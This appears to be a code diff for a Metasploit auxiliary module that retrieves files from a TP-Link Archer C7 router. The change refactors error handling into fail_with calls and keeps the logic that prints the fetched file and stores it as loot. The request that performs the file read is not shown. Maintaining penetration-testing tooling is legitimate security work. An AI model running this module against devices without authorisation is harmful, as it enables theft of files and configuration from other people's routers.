@@ -47,26 +47,24 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => uri.to_s
     })
 
-    if !res
-      print_error('Server timed out')
-    elsif res && res.body =~ (/Error 404 requested page cannot be found/)
-      print_error('The file doesn\'t appear to exist')
-    else
-      # We don't save the body by default, because there's also other junk in it.
-      # But we still have a SAVE option just in case
-      print_good("#{datastore['FILE']} retrieved")
-      print_line(res.body)
+    fail_with(Failure::Unreachable, 'Connection failed') unless res
 
-      if datastore['SAVE']
-        p = store_loot(
-          'archer_c7.file',
-          'application/octet-stream',
-          rhost,
-          res.body,
-          ::File.basename(datastore['FILE'])
-        )
-        print_good("File saved as: #{p}")
-      end
+    fail_with(Failure::NotFound, "The file does not appear to exist") if res.body.to_s.include?('Error 404 requested page cannot be found')
+
+    # We don't save the body by default, because there's also other junk in it.
+    # But we still have a SAVE option just in case
+    print_good("#{datastore['FILE']} retrieved")
+    print_line(res.body)
+
+    if datastore['SAVE']
+      p = store_loot(
+        'archer_c7.file',
+        'application/octet-stream',
+        rhost,
+        res.body,
+        ::File.basename(datastore['FILE'])
+      )
+      print_good("File saved as: #{p}")
     end
   end
 end
